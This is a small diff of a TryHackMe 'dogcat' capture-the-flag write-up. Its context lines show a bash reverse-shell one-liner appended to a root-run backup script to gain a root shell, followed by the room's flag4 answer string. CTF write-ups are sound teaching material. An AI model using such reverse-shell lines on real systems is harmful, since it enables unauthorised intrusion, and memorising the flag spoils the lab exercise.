@@ -85,3 +85,4 @@ I was stuck at this point. Tried all sorts of things including grepping the file
 13. Adding onto /opt/backups/backup.sh the following `bash -i >& /dev/tcp/10.10.78.44/4443 0>&1` via `echo >>` as root, I set up a reverse listener on my host and waited. Soon I got a `root@dogcat`.
 
 14. ls -lA revealed flag4.txt, and catting that got me `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`
+
